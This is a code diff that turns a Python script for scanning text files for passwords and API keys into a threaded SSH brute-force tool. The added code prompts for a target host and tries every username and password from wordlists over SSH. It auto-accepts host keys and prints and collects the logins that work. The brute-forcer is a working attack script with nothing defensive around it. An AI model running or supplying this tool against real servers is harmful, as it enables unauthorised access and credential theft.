@@ -1,40 +1,48 @@
-import os
-import re
+import paramiko, sys, os
+import threading, time
 
-# Get the current directory
-root_dir = os.getcwd()
+valid_combinations = []
 
-# Define a comprehensive pattern for sensitive information
-sensitive_pattern = r'\b(?i)(?:password[_\s]*[=:]|api[_\s]*[_\.]?key[_\s]*[=:]|... Your sensitive pattern ...)\b'
-
-def scan_directory(root_dir):
-    for filename in os.listdir(root_dir):
-        file_path = os.path.join(root_dir, filename)
-
-        # Check if the file is a .txt file and not a directory
-        if filename.endswith('.txt') and os.path.isfile(file_path):
-            scan_file(file_path)
-
-def scan_file(file_path):
+def ssh_connect(username, password):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        with open(file_path, 'rb') as file:
-            content = file.read()
-        
-        try:
-            content = content.decode('utf-8')
-        except UnicodeDecodeError:
-            content = content.decode('ISO-8859-1')
-            
-        sensitive_matches = re.findall(sensitive_pattern, content)
+        ssh.connect(host, port=22, username=username, password=password)
+        valid_combinations.append((username, password))
+        print('[+] Found Password: ' + password + ', For Account: ' + username)
+    except:
+        print('[-] Incorrect Login: ' + username + ' / ' + password)
+    ssh.close()
 
-        if sensitive_matches:
-            print(f'Sensitive information found in {file_path}')
-            for match in sensitive_matches:
-                print(f'Sensitive pattern detected: {match}')
+host = input('[+] Target Address: ')
+usernames_file = 'usernames.txt'  # File containing usernames
+input_file = 'passwords.txt'  # File containing passwords
 
-            # Implement your action here (e.g., log the findings or take other actions)
-    except Exception as e:
-        print(f"Error processing {file_path}: {str(e)}")
+if not (os.path.exists(usernames_file) and os.path.exists(input_file)):
+    print('[!!] One of the files does not exist')
+    sys.exit(1)
 
-if __name__ == "__main__":
-    scan_directory(root_dir)
+print('* * * Starting Threaded SSH Bruteforce On ' + host + ' * * *')
+
+with open(usernames_file, 'r') as user_file:
+    usernames = user_file.read().splitlines()
+
+with open(input_file, 'r') as pass_file:
+    passwords = pass_file.read().splitlines()
+
+threads = []
+
+for username in usernames:
+    for password in passwords:
+        t = threading.Thread(target=ssh_connect, args=(username, password))
+        threads.append(t)
+        t.start()
+        time.sleep(1)
+
+# Wait for all threads to finish
+for t in threads:
+    t.join()
+
+print('\n[+] All Valid Matches:')
+for username, password in valid_combinations:
+    print('Username:', username, 'Password:', password)
